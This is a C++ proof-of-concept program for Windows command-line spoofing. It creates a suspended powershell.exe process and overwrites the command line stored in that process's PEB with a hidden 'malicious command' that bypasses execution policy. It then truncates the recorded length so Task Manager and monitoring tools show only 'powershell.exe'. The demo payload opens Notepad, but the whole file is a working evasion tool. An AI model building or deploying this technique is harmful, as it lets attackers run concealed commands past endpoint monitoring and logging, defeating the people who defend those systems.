#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "ntdll.lib")

// Native API function prototypes
extern "C" NTSTATUS NtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToRead,
    PULONG NumberOfBytesRead
);

extern "C" NTSTATUS NtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

extern "C" NTSTATUS NtResumeThread(
    HANDLE ThreadHandle,
    PULONG SuspendCount
);

// Custom PEB structure to match C# exactly
struct CUSTOM_PEB {
    BYTE Filler[16];
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
};

// Custom RTL_USER_PROCESS_PARAMETERS structure to match C# exactly
struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
    BYTE Filler[112];
    USHORT Length;
    USHORT MaximumLength;
    PVOID CommandLine;
};

// Debug functions
void Debug(const std::wstring& text) {
#ifdef _DEBUG
    std::wcout << text << std::endl;
#endif
}

void Debug(const std::wstring& text, const std::vector<std::wstring>& args) {
#ifdef _DEBUG
    std::wstring formatted = text;
    for (size_t i = 0; i < args.size(); i++) {
        std::wstring placeholder = L"{" + std::to_wstring(i) + L"}";
        size_t pos = formatted.find(placeholder);
        if (pos != std::wstring::npos) {
            formatted.replace(pos, placeholder.length(), args[i]);
        }
    }
    std::wcout << formatted << std::endl;
#endif
}

// Helper function to pad string
std::wstring PadRight(const std::wstring& str, size_t totalWidth, wchar_t paddingChar) {
    if (str.length() >= totalWidth) return str;
    return str + std::wstring(totalWidth - str.length(), paddingChar);
}

int main() {
    // The malicious command (exactly as in C#)
    std::wstring maliciousCommand = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";


    // The command to spoof (exactly as in C#)
    std::wstring spoofedCommand = PadRight(L"powershell.exe", maliciousCommand.length(), L' ');

    Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
    Debug(L"[+] Malicious command length: " + std::to_wstring(maliciousCommand.length()));
    Debug(L"[+] Malicious command: " + maliciousCommand);
    Debug(L"[+] Spoofed command length: " + std::to_wstring(spoofedCommand.length()));
    Debug(L"[+] Spoofed command: " + spoofedCommand.substr(0, spoofedCommand.find_last_not_of(L' ') + 1));
    Debug(L"[+] Spoofed command (with padding): " + spoofedCommand);

    // Spawn a process to spoof the command line of
    Debug(L"[+] Creating suspended process...");
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(sa);
    PROCESS_INFORMATION pi = { 0 };

    Debug(L"[+] Calling CreateProcessW with command: " + spoofedCommand);
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(spoofedCommand.c_str()),
        &sa,
        &sa,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        L"C:\\windows\\",
        &si,
        &pi
    );

    if (!success) {
        DWORD error = GetLastError();
        Debug(L"[!] Unable to spawn process! Error code: " + std::to_wstring(error));
        return 1;
    }

    Debug(L"[+] Process spawned successfully!");
    Debug(L"[+] Process ID: " + std::to_wstring(pi.dwProcessId));
    Debug(L"[+] Thread ID: " + std::to_wstring(pi.dwThreadId));

    // Grab the PEB address of the newly spawned process
    Debug(L"[+] Querying process information...");
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != 0) {
        Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(status));
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    Debug(L"[+] NtQueryInformationProcess successful!");
    Debug(L"[+] Return length: " + std::to_wstring(returnLength));
    std::wstringstream ss;
    ss << std::hex << pbi.PebBaseAddress;
    Debug(L"[+] PEB Address: 0x" + ss.str());

    // Read the PEB structure, so we can get the ProcessParameters address
    Debug(L"[+] Reading PEB structure...");
    CUSTOM_PEB peb = { 0 };
    SIZE_T bytesRead = 0;
    status = NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), (PULONG)&bytesRead);

    if (status != 0) {
        Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(status));
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
    std::wstringstream ss2;
    ss2 << std::hex << peb.ProcessParameters;
    Debug(L"[+] ProcessParameters Address: 0x" + ss2.str());

    // Read the ProcessParameters structure, so we can get the CmdLine address
    Debug(L"[+] Reading ProcessParameters structure...");
    CUSTOM_RTL_USER_PROCESS_PARAMETERS procParams = { 0 };
    status = NtReadVirtualMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), (PULONG)&bytesRead);

    if (status != 0) {
        Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(status));
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
    Debug(L"[+] CommandLine Length: " + std::to_wstring(procParams.Length));
    Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(procParams.MaximumLength));

    std::wstringstream ss3;
    ss3 << std::hex << procParams.CommandLine;
    Debug(L"[+] CommandLine Address: 0x" + ss3.str());

    // Read the CommandLine address
    Debug(L"[+] Reading original command line...");
    std::vector<wchar_t> cmdLineBuffer(procParams.Length / sizeof(wchar_t));
    status = NtReadVirtualMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, (PULONG)&bytesRead);

    if (status != 0) {
        Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(status));
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    std::wstring cmdLine(cmdLineBuffer.data());
    Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(bytesRead));
    Debug(L"[+] Original CommandLine: " + cmdLine);

    // We need to write byte array to procParams.CommandLine
    Debug(L"[+] Preparing to write malicious command...");
    std::vector<wchar_t> newCmdLine(maliciousCommand.begin(), maliciousCommand.end());
    Debug(L"[+] New command line length: " + std::to_wstring(newCmdLine.size()));
    Debug(L"[+] New command line size in bytes: " + std::to_wstring(newCmdLine.size() * sizeof(wchar_t)));

    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), (PULONG)&bytesWritten);

    if (status != 0) {
        Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(status));
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(bytesWritten));

    // We also need to write the spoofed command length as ushort to peb.ProcessParameters + 112 bytes
    // This is the key part - we set the length to only show "powershell.exe" length
    Debug(L"[+] Writing spoofed command length...");
    USHORT cmdLineLength = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
    Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(cmdLineLength));

    std::wstringstream addrStream;
    addrStream << std::hex << (ULONG_PTR)((BYTE*)peb.ProcessParameters + 112);
    Debug(L"[+] Writing to address: 0x" + addrStream.str());

    status = NtWriteVirtualMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), (PULONG)&bytesWritten);

    if (status != 0) {
        Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(status));
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(bytesWritten));
    Debug(L"[+] SPOOFING COMPLETE!");
    Debug(L"[+] Process will now show as: powershell.exe");
    Debug(L"[+] But will actually execute: " + maliciousCommand);

    // Resume the process
    Debug(L"[+] Resuming suspended process...");
    ULONG suspendCount = 0;
    status = NtResumeThread(pi.hThread, &suspendCount);

    if (status == 0) {
        Debug(L"[+] Process resumed successfully!");
        Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(status));
        Debug(L"[+] Previous suspend count: " + std::to_wstring(suspendCount));
    } else {
        Debug(L"[!] Failed to resume process! NTSTATUS: 0x" + std::to_wstring(status));
    }
    Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
    Debug(L"Press a key to end PoC...");
    std::wcin.get();

    // Cleanup
    Debug(L"[+] Cleaning up handles...");
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    Debug(L"[+] Cleanup complete!");

    return 0;
}
